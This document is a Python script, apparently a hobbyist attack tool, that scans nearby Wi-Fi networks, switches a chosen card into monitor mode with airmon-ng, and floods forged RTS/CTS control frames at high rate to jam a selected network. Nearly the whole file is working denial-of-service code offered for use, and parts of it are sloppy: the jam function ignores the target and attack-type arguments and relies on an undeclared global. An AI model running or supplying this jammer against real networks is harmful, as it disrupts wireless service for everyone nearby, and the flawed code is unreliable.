from scapy.all import *
from wifi import Cell
import time
from wireless import Wireless
import os
import sys
from subprocess import Popen, PIPE

DN = open(os.devnull, 'w')

# Network scanner
def network_scan():
    wifi_card = Wireless()
    interface = wifi_card.interface()
    wifi_collect = Cell.all(interface)
    print ("Available networks scan in progress ...")
    print ("#" * 70)
    bssid = []
    time.sleep(2)
    numero = 0
    for wi in wifi_collect:
        print("Network number: " + str(numero))
        print("SSID: " + wi.ssid)
        print("BSSID: " + wi.address)
        print("Channel: " + str(wi.channel))
        #print("Quality: " + str(wi.quality))
        print("+-" * 10)
        bssid.append(wi.address)
        time.sleep(0.5)
        numero += 1
    print ("#" * 70)
    return bssid

def packet_handler(pkt) :
    if pkt.haslayer(Dot11FCS) and pkt.type == 1 and pkt.subtype == 11:
        pkt.show()
        packet = RadioTap()/Dot11(type=1,subtype=11,addr1=pkt.addr2, addr2='00:C0:CA:98:02:B5',addr3=pkt.addr2, ID=0xFF7F)
        packet.show()
        sendp(packet, iface = card, count=1000000, inter=0.001)

def jam(address, card, card_mac, sub):
    #conf.verb = 0  # shut up Scapy
    sniff(iface=card, stop_filter= packet_handler)

if __name__ == "__main__":

	FNULL = open(os.devnull, 'w')

	bssid = network_scan()

	red = input("Tell me the network number you want to jam: ")

    #Call airmon-ng to show the user a list of available network cards on their device
	subprocess.call('airmon-ng', shell=True)

    #Select a network card
	networkCard = input('Please enter the name of the network card you wish to use: ')

	#Kill all processes that can interrupt
	subprocess.call('airmon-ng check kill', stdout=FNULL, stderr=subprocess.STDOUT, shell=True)

    #Start monitor mode on the selected device and run 'airmon-ng check kill' to kill of any process that may be interfering with the network card
	subprocess.call('airmon-ng start {}'.format(networkCard), stdout=FNULL, stderr=subprocess.STDOUT, shell=True)

    #Call airmon-ng to show the user a list of available network cards on their device
	subprocess.call('airmon-ng', shell=True)

    #Select a monitor mode network card
	card = input('Please enter the name of the monitor mode network card you wish to use: ')

	card_mac = subprocess.Popen('ifdata -ph {}'.format(card), stdout=PIPE, shell=True).stdout
	card_mac = card_mac.read()
	card_mac = card_mac.decode()

    #injection test before inject RTS/CTS paquets in the network
	try:
		while True:
			print("Do ctrl + c when it start to inject.")
			subprocess.call('aireplay-ng --test {}'.format(card), shell=True)
	except KeyboardInterrupt:
		sub = ''

		while sub != 'rts' and sub != 'cts':
		    sub = input('What type of flooding attack do you want to do: rts or cts: ')
		    if sub != 'rts' and sub != 'cts':
		        print("Sorry, that's not an option. Choose between rts or cts.")

		bssid_selected = bssid[int(red)]

		jam(bssid[int(red)], card, card_mac , sub)
